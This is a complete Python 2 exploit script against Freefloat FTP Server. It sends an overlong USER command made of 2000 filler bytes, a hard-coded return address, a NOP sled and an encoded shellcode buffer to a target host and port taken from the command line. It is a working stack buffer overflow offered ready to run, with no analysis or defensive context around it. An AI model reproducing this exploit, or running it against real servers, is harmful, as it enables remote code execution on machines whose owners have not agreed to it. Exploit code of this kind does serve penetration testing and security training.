# Freefloat FTP server

import sys, socket, time

host = sys.argv[1] 
port = int(sys.argv[2])

# 0x7c9d318b

buf =  ""
buf += "\xbb\x48\x27\x93\x27\xd9\xc7\xd9\x74\x24\xf4\x5a\x33"
buf += "\xc9\xb1\x52\x31\x5a\x12\x03\x5a\x12\x83\x8a\x23\x71"
buf += "\xd2\xf6\xc4\xf7\x1d\x06\x15\x98\x94\xe3\x24\x98\xc3"
buf += "\x60\x16\x28\x87\x24\x9b\xc3\xc5\xdc\x28\xa1\xc1\xd3"
buf += "\x99\x0c\x34\xda\x1a\x3c\x04\x7d\x99\x3f\x59\x5d\xa0"
buf += "\x8f\xac\x9c\xe5\xf2\x5d\xcc\xbe\x79\xf3\xe0\xcb\x34"
buf += "\xc8\x8b\x80\xd9\x48\x68\x50\xdb\x79\x3f\xea\x82\x59"
buf += "\xbe\x3f\xbf\xd3\xd8\x5c\xfa\xaa\x53\x96\x70\x2d\xb5"
buf += "\xe6\x79\x82\xf8\xc6\x8b\xda\x3d\xe0\x73\xa9\x37\x12"
buf += "\x09\xaa\x8c\x68\xd5\x3f\x16\xca\x9e\x98\xf2\xea\x73"
buf += "\x7e\x71\xe0\x38\xf4\xdd\xe5\xbf\xd9\x56\x11\x4b\xdc"
buf += "\xb8\x93\x0f\xfb\x1c\xff\xd4\x62\x05\xa5\xbb\x9b\x55"
buf += "\x06\x63\x3e\x1e\xab\x70\x33\x7d\xa4\xb5\x7e\x7d\x34"
buf += "\xd2\x09\x0e\x06\x7d\xa2\x98\x2a\xf6\x6c\x5f\x4c\x2d"
buf += "\xc8\xcf\xb3\xce\x29\xc6\x77\x9a\x79\x70\x51\xa3\x11"
buf += "\x80\x5e\x76\xb5\xd0\xf0\x29\x76\x80\xb0\x99\x1e\xca"
buf += "\x3e\xc5\x3f\xf5\x94\x6e\xd5\x0c\x7f\x51\x82\x85\xfd"
buf += "\x39\xd1\x99\x14\x0e\x5c\x7f\x7c\x7e\x09\x28\xe9\xe7"
buf += "\x10\xa2\x88\xe8\x8e\xcf\x8b\x63\x3d\x30\x45\x84\x48"
buf += "\x22\x32\x64\x07\x18\x95\x7b\xbd\x34\x79\xe9\x5a\xc4"
buf += "\xf4\x12\xf5\x93\x51\xe4\x0c\x71\x4c\x5f\xa7\x67\x8d"
buf += "\x39\x80\x23\x4a\xfa\x0f\xaa\x1f\x46\x34\xbc\xd9\x47"
buf += "\x70\xe8\xb5\x11\x2e\x46\x70\xc8\x80\x30\x2a\xa7\x4a"
buf += "\xd4\xab\x8b\x4c\xa2\xb3\xc1\x3a\x4a\x05\xbc\x7a\x75"
buf += "\xaa\x28\x8b\x0e\xd6\xc8\x74\xc5\x52\xf8\x3e\x47\xf2"
buf += "\x91\xe6\x12\x46\xfc\x18\xc9\x85\xf9\x9a\xfb\x75\xfe"
buf += "\x83\x8e\x70\xba\x03\x63\x09\xd3\xe1\x83\xbe\xd4\x23"

#ret = '\x8b\x31\x9d\x7c' 
ret = '\xD7\x30\x9D\x7C'

fuzz_case = 'A' * 2000 + ret + '\x90' * 20 + buf 

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))
client.recv(1024)
client.send("USER " + fuzz_case)
client.recv(1024)
client.send("PASS pass")
client.recv(1024)
client.close()
